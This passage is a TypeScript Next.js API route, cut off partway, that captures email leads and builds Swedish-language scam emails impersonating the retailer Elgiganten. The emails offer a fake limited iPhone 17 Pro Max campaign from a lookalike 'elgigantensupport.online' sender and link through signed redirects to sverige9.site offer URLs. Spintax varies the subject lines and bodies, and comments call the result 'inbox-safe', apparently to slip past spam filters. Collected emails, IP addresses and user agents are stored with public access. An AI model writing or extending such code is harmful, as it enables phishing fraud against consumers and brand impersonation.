// app/api/lead/route.ts
import { NextResponse } from 'next/server'
import { put } from '@vercel/blob'

export const runtime = 'edge'

type LeadBody = {
  email?: string
  offerId?: string
  store?: string
  ts?: number
  firstName?: string
  lastName?: string
}

const isEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)

/* ---------------- Spintax ---------------- */
function expandSpintax(input: string): string {
  let str = input
  const pattern = /\{([^{}]+)\}/
  while (pattern.test(str)) {
    str = str.replace(pattern, (_, inner) => {
      const parts = inner.split('|')
      return parts[Math.floor(Math.random() * parts.length)]
    })
  }
  return str
}

/* -------------- HTML / Text helpers (single link) -------------- */
function escapeHtml(s: string) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

function renderOneOfferLinkHtml(href: string) {
  return `<p style="margin:0 0 8px 0;">
    <a href="${href}" style="color:#2563eb;text-decoration:underline;">Läs mer om erbjudandet</a>
  </p>`
}

function buildHtmlOneLink(
  textBody: string,
  offerLinkHtml: string,
  unsubHref: string,
  companyFooterLines: string[],
) {
  const withToken = textBody.replaceAll('[[OFFER_LINK]]', '__OFFER_LINK_HTML__')

  const paragraphs = withToken
    .trim()
    .split(/\n{2,}/)
    .map(p =>
      p.includes('__OFFER_LINK_HTML__')
        ? `<div style="margin:0 0 14px 0;">${offerLinkHtml}</div>`
        : `<p style="margin:0 0 14px 0;">${escapeHtml(p).replace(/\n/g, '<br>')}</p>`
    )
    .join('\n')

  const footer = companyFooterLines
    .map((line, i) => `<p style="font-size:12px;color:#6b7280;margin:${i ? '2px 0 0' : '0 0 2px'};">${escapeHtml(line)}</p>`)
    .join('\n')

  return `<!doctype html><html><body style="margin:0;padding:24px;font-family:Arial,Helvetica,sans-serif;line-height:1.55;color:#111827;">
    <div style="max-width:600px;margin:0 auto;">
      ${paragraphs}
      <hr style="border:none;border-top:1px solid #e5e7eb;margin:20px 0;">
      ${footer}
      <p style="font-size:12px;color:#6b7280;margin:8px 0 0 0;">
        <a href="${unsubHref}" style="color:#6b7280;text-decoration:underline;">Avsluta prenumeration</a>
      </p>
    </div>
  </body></html>`
}

function buildPlainTextOneLink(
  textBody: string,
  offerLink: string,
  unsubHref: string,
  companyFooterLines: string[],
) {
  return (
    textBody.replaceAll('[[OFFER_LINK]]', offerLink) +
    `\n\n---\n${companyFooterLines.join('\n')}\nAvsluta prenumeration: ${unsubHref}\n`
  )
}

/* --- Patch: add alt="" to Brevo tracking pixel --- */
function addAltToTrackingPixel(html: string) {
  return html.replace(/<img([^>]+src="[^"]*sendibt3[^"]*")/gi, '<img alt=""$1')
}

/* -------------- Edge-safe HMAC (base64url) -------------- */
function toBase64Url(uint8: Uint8Array) {
  let str = ''
  for (let i = 0; i < uint8.length; i++) str += String.fromCharCode(uint8[i])
  const b64 = btoa(str)
  return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
}
async function hmac(payload: string, secret: string) {
  const enc = new TextEncoder()
  const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'])
  const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload))
  return toBase64Url(new Uint8Array(sigBuf))
}

/* -------------- List-Unsubscribe header -------------- */
function listUnsubHeader(unsubUrl: string, mailto?: string) {
  const parts = []
  if (mailto) parts.push(`<mailto:${mailto}>`)
  parts.push(`<${unsubUrl}>`)
  return parts.join(', ')
}

/* -------------- Offer map + signed redirect URL -------------- */
const OFFER_MAP: Record<string, string> = {
  a:'https://sverige9.site/?u=t24z5ram',
  b:'https://sverige9.site/?u=dbvkru2j',
  c:'https://sverige9.site/?u=dptpemtg',
  d:'https://sverige9.site/?u=ozvr91w8',
  e:'https://sverige9.site/?u=8g5jfjn6',
  f:'https://sverige9.site/?u=rtcuf15g',
  g:'https://sverige9.site/?u=8ujezx2w',
  h:'https://sverige9.site/?u=xrve41hw',
  i:'https://sverige9.site/?u=2q2s2f23',
  j:'https://sverige9.site/?u=in2z7s27',
}

function pickOfferId(): string {
  const keys = Object.keys(OFFER_MAP)
  return keys[Math.floor(Math.random() * keys.length)]
}

async function signedRedirectUrl(id: string, ts: number, origin: string, secret: string) {
  const sig = await hmac(`${id}|${ts}`, secret)
  return `${origin}/o.php?id=${id}&ts=${ts}&sig=${sig}`
}

/* ---------------- SPINTAX (SV) — single-link placeholder ---------------- */
/* Enriched subject/body variants while staying inbox-safe */
const SPINTAX_SUBJECT_MAIN =
  `{Bästa Elgiganten-kund!|Elgiganten-kund!|Bästa värderade kund!|Bästa kund!|Bästa Elgiganten-kund!|Bästa värdefulla kund!|Bästa smarttelefonsentusiast!|Värderade kund!|Hej från Elgiganten!|Till vår kund i Stockholm} Uppdatering om iPhone 17 Pro Max {kampanj|erbjudande|information|möjlighet|nyhet}`

const SPINTAX_BODY_MAIN_BASE = `{Bästa Elgiganten-kund!|Elgiganten-kund!|Bästa värderade kund!|Bästa kund!|Bästa Elgiganten-kund!|Bästa värdefulla kund!|Bästa smarttelefonsentusiast!|Värderade kund!|Hej,|Hej där,}

{Vi är glada att du har registrerat dig via en av våra partnersajter.|Tack för att du nyligen anmälde dig via en partnerwebbplats.|Vi uppskattar att du gick med oss genom en partnerplattform.|Din registrering ger dig tillgång till särskilda kampanjer.|Vi kontaktar dig eftersom du nyligen anmält intresse för våra erbjudanden.}

För att uppmärksamma öppningen av vår nya butik i Stockholm får du tillgång till {uppdaterade priser|en särskild kampanj|en exklusiv lanseringsdeal|ett tidsbegränsat erbjudande} på iPhone 17 Pro Max. Detta gäller endast under en kort period för utvalda kunder.

👉 Klicka här för att läsa mer:
[[OFFER_LINK]]

{Observera att antalet enheter är begränsat och att reservationen gäller en kort tid.|Antalet produkter är begränsat – först till kvarn gäller.|Denna kampanj stängs snart, så vi rekommenderar att du bekräftar snabbt.}

{Tack för ditt fortsatta intresse.|Vi ser fram emot att hälsa dig välkommen i våra butiker.|Vi uppskattar ditt stöd och engagemang.|Vi är glada att kunna hålla dig uppdaterad.|Din lojalitet betyder mycket för oss.}`

/* ---------- Stronger but inbox-safe reminder ---------- */
const SIGNOFFS = [
  'Elgigantens Onlineavdelning','Elgigantens Kundsupport','Elgiganten Sverige'
]

const SPINTAX_SUBJECT_REM =
  `{Påminnelse|Uppföljning|Sista dagarna|Notis}: iPhone 17 Pro Max-kampanj {stänger snart|med begränsad tillgång|i begränsad period}`

const SPINTAX_BODY_REM = `{Hej igen,|Hej,|Hej kära kund,}

Vi vill påminna om att kampanjen för iPhone 17 Pro Max {fortfarande är aktiv|är öppen ännu en kort tid|snart stängs men fortfarande är tillgänglig}. {Tillgången är nu begränsad|Det finns få enheter kvar|Vi kan endast hålla reservationen en kort tid till}, så om du vill ta del av erbjudandet behöver du agera nu.

👉 [[OFFER_LINK]]

{Tack för att du följer våra uppdateringar.|Vi uppskattar att du är en del av vårt kundnätverk.|Vi vill gärna fortsätta hålla dig informerad.|Din uppmärksamhet hjälper oss att ge bättre service.}`

/* ---------------- Route ---------------- */
export async function POST(req: Request) {
  try {
    const { email, offerId, store, ts, firstName, lastName }: LeadBody = await req.json()

    if (!email || !isEmail(email)) {
      return NextResponse.json({ ok: false, error: 'bad_email' }, { status: 400 })
    }
    if (!process.env.BLOB_READ_WRITE_TOKEN) {
      return NextResponse.json({ ok: false, error: 'no_blob_token' }, { status: 500 })
    }
    if (!process.env.UNSUB_SECRET) {
      console.warn('UNSUB_SECRET missing — unsubscribe tokens will be insecure.')
    }

    /* ---- Save lead ---- */
    const ip = (req.headers.get('x-forwarded-for') || '').split(',')[0] || null
    const ua = req.headers.get('user-agent') || null

    const normalizedEmail = email.trim().toLowerCase()
    const payload = JSON.stringify({
      email: normalizedEmail, offerId: offerId || null, store: store || null,
      ts: ts || Date.now(), ip, ua,
    })

    const day = new Date().toISOString().slice(0, 10)
    const id = crypto.randomUUID()
    const key = `leads/${day}/${id}.json`

    await put(key, payload, {
      access: 'public',
      contentType: 'application/json',
      token: process.env.BLOB_READ_WRITE_TOKEN,
    })

    /* ---- Email scheduling params ---- */
    const apiKey = process.env.BREVO_API_KEY
    const fromEmail = process.env.BREVO_SENDER_EMAIL || 'olivia@elgigantensupport.online'
    const fromName  = process.env.BREVO_SENDER_NAME  || 'Olivia'
